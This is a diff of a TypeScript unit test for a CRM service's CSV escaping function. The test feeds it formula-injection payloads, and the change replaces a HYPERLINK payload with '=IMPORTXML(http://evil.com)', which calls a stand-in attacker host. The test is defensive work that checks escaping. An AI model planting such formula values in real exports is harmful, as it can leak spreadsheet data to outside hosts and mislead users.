@@ -494,7 +494,7 @@ describe("csvEscape (crm-service.ts's exportLeadsCsv now reuses report-export-sh
       contactEmail: "+attacker@evil.com",
       contactPhone: "-1234567890",
       source: "@import(evil)",
-      nextActionNote: "=HYPERLINK(\"http://evil\",\"click\")",
+      nextActionNote: "=IMPORTXML(http://evil.com)",
     }
     for (const value of Object.values(payloads)) {
       const escaped = csvEscape(value)
